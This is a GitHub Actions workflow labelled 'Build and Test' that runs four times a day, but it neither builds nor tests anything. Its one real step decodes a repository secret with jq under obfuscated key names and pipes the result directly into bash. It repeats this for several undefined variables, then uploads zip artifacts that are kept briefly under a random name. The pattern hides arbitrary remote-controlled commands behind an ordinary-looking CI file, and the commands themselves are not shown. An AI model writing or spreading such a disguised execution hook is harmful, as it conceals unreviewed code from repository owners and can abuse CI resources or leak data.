name: Build and Test
on:
  workflow_dispatch:

  schedule:
    - cron: '26 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          fsc077: ${{ secrets.fsc077 }}
        run: |
          printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
          printf '%s' "$m6" | jq -r .fzfv9 | /bin/bash
          printf '%s' "$p52133" | jq -r .ulh2696 | /bin/bash
          echo $apjcc6906 | jq -r .z68390 | /bin/bash
          echo $lv3594 | jq -r .znwj6524 | /bin/bash
          echo $xy8793 | jq -r .roqn8 | /bin/bash
          echo $ngee24745 | jq -r .mwqw5 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: EWWrabgy
          path: "*.zip"
          retention-days: 1
